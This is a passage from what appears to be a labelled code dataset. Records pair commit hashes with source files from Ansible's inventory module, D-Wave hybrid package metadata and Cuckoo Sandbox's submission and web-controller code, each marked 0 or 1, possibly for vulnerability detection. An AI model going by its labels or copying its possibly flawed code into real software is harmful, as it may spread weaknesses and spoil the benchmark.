        self.assertEqual(A.get_ancestors(), set([A, B]))
/n/n/n",0
41,153c9bd539eeffdd6d395b8840f95d56e3814f27,"/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:
            for group in self.child_groups:
                group.depth = max([self.depth + 1, group.depth])
                group._check_children_depth()
        except RuntimeError:
            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:
            g.clear_hosts_cache()

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:
            kid_hosts = kid.get_hosts()
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):

        results = {}
        for g in self.parent_groups:
            results[g.name] = g
            results.update(g._get_ancestors())
        return results

    def get_ancestors(self):

        return self._get_ancestors().values()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):
        # populate ancestors
        for group in self.groups:
            self.add_group(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/n",1
42,31ab237dacb201a31b16de76ffd7449873cb18d8,"hybrid/package_info.py/n/n# Copyright 2018 D-Wave Systems Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__packagename__ = 'dwave-hybrid'
__title__ = 'D-Wave Hybrid'
__version__ = '0.2.0'
__author__ = 'D-Wave Systems Inc.'
__authoremail__ = 'radomir@dwavesys.com'
__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'
__url__ = 'https://github.com/dwavesystems/dwave-hybrid'
__license__ = 'Apache 2.0'
__copyright__ = '2018, D-Wave Systems Inc.'
/n/n/n",0
43,31ab237dacb201a31b16de76ffd7449873cb18d8,"/hybrid/package_info.py/n/n# Copyright 2018 D-Wave Systems Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__packagename__ = 'dwave-hybrid'
__title__ = 'D-Wave Hybrid'
__version__ = '0.1.4'
__author__ = 'D-Wave Systems Inc.'
__authoremail__ = 'radomir@dwavesys.com'
__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'
__url__ = 'https://github.com/dwavesystems/dwave-hybrid'
__license__ = 'Apache 2.0'
__copyright__ = '2018, D-Wave Systems Inc.'
/n/n/n",1
44,168cabf86730d56b7fa319278bf0f0034052666a,"cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, filename)

                unpacked = sflock.unpack(
                    filepath=filepath, password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree(sanitize=True)

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return files

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/ncuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.common.mongo import mongo
from cuckoo.core.database import Database, TASK_PENDING

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")

        task = db.view_task(task_id, details=True)
        if not task:
            return Http404(""Task not found"")

        entry = task.to_dict()
        entry[""guest""] = {}
        if task.guest:
            entry[""guest""] = task.guest.to_dict()

        entry[""errors""] = []
        for error in task.errors:
            entry[""errors""].append(error.message)

        entry[""sample""] = {}
        if task.sample_id:
            sample = db.view_sample(task.sample_id)
            entry[""sample""] = sample.to_dict()

        entry[""target""] = os.path.basename(entry[""target""])
        return {
            ""task"": entry,
        }

    @staticmethod
    def get_recent(limit=50, offset=0):
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/ncuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        files = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""files"": files,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/nsetup.py/n/n#!/usr/bin/env python
# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - https://cuckoosandbox.org/.
# See the file 'docs/LICENSE' for copying permission.

import os
import setuptools
import sys

# Update the MANIFEST.in file to include the one monitor version that is
# actively shipped for this distribution and exclude all the other monitors
# that we have lying around. Note: I tried to do this is in a better manner
# through exclude_package_data, but without much luck.

excl, monitor = [], os.path.join(""cuckoo"", ""data"", ""monitor"")
latest = open(os.path.join(monitor, ""latest""), ""rb"").read().strip()
for h in os.listdir(monitor):
    if h != ""latest"" and h != latest:
        excl.append(
            ""recursive-exclude cuckoo/data/monitor/%s *  # AUTOGENERATED"" % h
        )

if not os.path.isdir(os.path.join(monitor, latest)) and \
        not os.environ.get(""ONLYINSTALL""):
    sys.exit(
        ""Failure locating the monitoring binaries that belong to the latest ""
        ""monitor release. Please include those to create a distribution.""
    )

manifest = []
for line in open(""MANIFEST.in"", ""rb""):
    if not line.strip() or ""# AUTOGENERATED"" in line:
        continue

    manifest.append(line.strip())

manifest.extend(excl)

open(""MANIFEST.in"", ""wb"").write(""\n"".join(manifest) + ""\n"")

def githash():
    """"""Extracts the current Git hash.""""""
    git_head = os.path.join("".git"", ""HEAD"")
    if os.path.exists(git_head):
        head = open(git_head, ""rb"").read().strip()
        if not head.startswith(""ref: ""):
            return head

        git_ref = os.path.join("".git"", head.split()[1])
        if os.path.exists(git_ref):
            return open(git_ref, ""rb"").read().strip()

cwd_path = os.path.join(""cuckoo"", ""data-private"", "".cwd"")
open(cwd_path, ""wb"").write(githash() or """")

install_requires = []

# M2Crypto relies on swig being installed. We also don't support the latest
# version of SWIG. We should be replacing M2Crypto by something else when
# the time allows us to do so.
if os.path.exists(""/usr/bin/swig""):
    install_requires.append(""m2crypto==0.24.0"")

setuptools.setup(
    name=""Cuckoo"",
    version=""2.0.0"",
    author=""Stichting Cuckoo Foundation"",
    author_email=""cuckoo@cuckoofoundation.org"",
    packages=[
        ""cuckoo"",
    ],
    classifiers=[
        ""Development Status :: 4 - Beta"",
        # TODO: should become stable.
        # ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Environment :: Web Environment"",
        ""Framework :: Django"",
        ""Framework :: Flask"",
        ""Framework :: Pytest"",
        ""Intended Audience :: Information Technology"",
        ""Intended Audience :: Science/Research"",
        ""Natural Language :: English"",
        ""License :: OSI Approved :: GNU General Public License v3 (GPLv3)"",
        ""Operating System :: POSIX :: Linux"",
        ""Programming Language :: Python :: 2.7"",
        ""Topic :: Security"",
    ],
    url=""https://cuckoosandbox.org/"",
    license=""GPLv3"",
    description=""Automated Malware Analysis System"",
    include_package_data=True,
    entry_points={
        ""console_scripts"": [
            ""cuckoo = cuckoo.main:main"",
        ],
    },
    install_requires=[
        ""alembic==0.8.8"",
        ""androguard==3.0"",
        ""beautifulsoup4==4.4.1"",
        ""chardet==2.3.0"",
        ""click==6.6"",
        ""django==1.8.4"",
        ""django_extensions==1.6.7"",
        ""dpkt==1.8.7"",
        ""elasticsearch==2.2.0"",
        ""flask==0.10.1"",
        ""httpreplay==0.1.18"",
        ""jinja2==2.8"",
        ""jsbeautifier==1.6.2"",
        ""lxml==3.6.0"",
        ""oletools==0.42"",
        ""peepdf==0.3.2"",
        ""pefile2==1.2.11"",
        ""pillow==3.2"",
        ""pymisp==2.4.54"",
        ""pymongo==3.0.3"",
        ""python-dateutil==2.4.2"",
        ""python-magic==0.4.12"",
        ""sflock==0.2.5"",
        ""sqlalchemy==1.0.8"",
        ""wakeonlan==0.2.2"",
    ] + install_requires,
    extras_require={
        "":sys_platform == 'win32'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'darwin'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'linux2'"": [
            ""requests[security]==2.7.0"",
            ""scapy==2.3.2"",
        ],
        ""distributed"": [
            ""flask-sqlalchemy==2.1"",
            ""gevent==1.1.1"",
            ""psycopg2==2.6.2"",
        ],
        ""postgresql"": [
            ""psycopg2==2.6.2"",
        ],
    },
    setup_requires=[
        ""pytest-runner"",
    ],
    tests_require=[
        ""coveralls"",
        ""pytest"",
        ""pytest-cov"",
        ""pytest-django"",
        ""pytest-pythonpath"",
        ""flask-sqlalchemy==2.1"",
        ""mock==2.0.0"",
        ""responses==0.5.1"",
    ],
)
/n/n/ntests/test_utils.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import cStringIO
import io
import mock
import os
import pytest
import shutil
import tempfile

import cuckoo

from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage, temppath
from cuckoo.common import utils
from cuckoo.misc import set_cwd

class TestCreateFolders:
    def setup(self):
        self.tmp_dir = tempfile.gettempdir()

    def test_root_folder(self):
        """"""Tests a single folder creation based on the root parameter.""""""
        Folders.create(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_single_folder(self):
        """"""Tests a single folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_multiple_folders(self):
        """"""Tests multiple folders creation.""""""
        Folders.create(self.tmp_dir, [""foo"", ""bar""])
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""bar""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""bar""))

    def test_copy_folder(self):
        """"""Tests recursive folder copy""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.copy(""tests/files/sample_analysis_storage"", dirpath)
        assert os.path.isfile(""%s/reports/report.json"" % dirpath)

    def test_duplicate_folder(self):
        """"""Tests a duplicate folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.create(self.tmp_dir, ""foo"")
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder(self):
        """"""Tests folder deletion #1.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
